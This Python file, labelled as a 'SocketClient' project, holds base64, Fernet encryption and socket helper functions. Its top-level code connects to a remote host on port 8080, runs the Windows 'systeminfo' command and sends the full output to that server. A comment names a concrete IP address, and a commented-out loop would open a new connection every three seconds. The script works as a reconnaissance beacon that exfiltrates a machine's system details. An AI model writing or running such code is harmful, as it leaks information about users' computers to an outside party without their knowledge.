# ------------------------- [ Sub Project File | Coding: utf-8 ] -------------------------- #
# Project: SocketClient                                                                     #
# File: main.py	                                                                            #
# Python Version: 3.10.2 - Tested: 3.10.2 - All others are untested.                        #
# The libraries should get installed among the integrated libraries: Libraries			    #
# ----------------------------------------- [ ! ] ----------------------------------------- #
# This code doesn't have any errors. if you got an error, check syntax and python version.  #
# ----------------------------------------- [ ! ] ----------------------------------------- #
# Author: nihadenes - <nihadenesvideo@gmail.com>                                            #
# Links: <https://github.com/nihadenes>                                                     #
# Date: Date                                                                          		#
# License: License																			#
# --------------------------------------- [ Enjoy ] --------------------------------------- #

import subprocess
import threading
import hashlib
import random
import string
import base64
import socket
import time
import json
import re

from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
from PIL import Image


# Functions for encrypting and hashing.

def encode64(encde):
    return base64.b64encode(encde.encode("utf-8")).decode("utf-8").strip("=")


def decode64(decde):
    try:
        return base64.b64decode(get64(decde).encode("utf-8")).decode("utf-8")
    except:
        return False


def isBase64(s):
    try:
        return base64.b64encode(base64.b64decode(s)).decode() == s
    except:
        return False


def get64(string):
    try:
        return string + "=" * [isBase64(string + x) for x in ["", "=", "=="]].index(True)
    except:
        return False


def hash_sha256(hash_string):
    sha_signature = \
        hashlib.sha256(hash_string.encode("utf-8")).hexdigest()
    return sha_signature


def fernetencrypt(key, string):
    try:
        return Fernet(key.encode("utf-8")).encrypt(string.encode("utf-8")).decode("utf-8")
    except Exception as e:
        return False


def fernetdecrypt(key, string):
    try:
        return Fernet(key.encode("utf-8")).decrypt(string.encode("utf-8")).decode("utf-8")
    except Exception as e:
        return False


def fernetgetkey(password, salt):
    return base64.urlsafe_b64encode(
        PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=hash_sha256(hash_sha256(salt)).encode("utf-8"),
                   iterations=100000,
                   backend=default_backend()).derive(hash_sha256(hash_sha256(password)).encode())).decode("utf-8")


# Useful functions.

def randomlet(lentgth):
    return ''.join(random.choice(string.ascii_letters) for i in range(lentgth))


def paragraph(string, liner):
    return [string[i:i + liner] for i in range(0, len(list(string)), liner)]


# Socket functions.

def getenc(packetype=None, message=None, ipadress=None):
    return json.dumps({"packagetype": packetype, "message": message, "ipadress": ipadress})


def getdec(msg):
    return json.loads(msg)


def send(msg, client):
    message = encode64(msg).encode(FORMAT)
    send_length = str(len(message)).encode(FORMAT) + b' ' * (HEADER - len(str(len(message)).encode(FORMAT)))
    client.send(send_length)
    client.send(message)
    return client.recv(2048).decode(FORMAT)


def newclient():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(ADDR)
        print(send(getenc(packetype="client.message", message=randomlet(16)), client))
        print(send(getenc(packetype="client.disconnect", message=randomlet(16)), client))
        del client
    except Exception as e:
        print(e)
        return False


SERVER, PORT, FORMAT, PREFIX, HEADER = "sussyip", 8080, "utf-8", "[INFO]", 64
ADDR = (SERVER, PORT)

# try:
# while True:
# thread = threading.Thread(target=newclient, args=())
# thread.start()
# time.sleep(3)
# except Exception as e:
#     print(f"An error occured, {e}")
#     input()
#193.164.7.174

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

output2 = [i[2:-2] for i in [str(item.split("\r")[:-1]) for item in subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')]]


print(send(getenc(packetype="client.message", message="\n".join(output2)), client))
print(send(getenc(packetype="client.disconnect"), client))


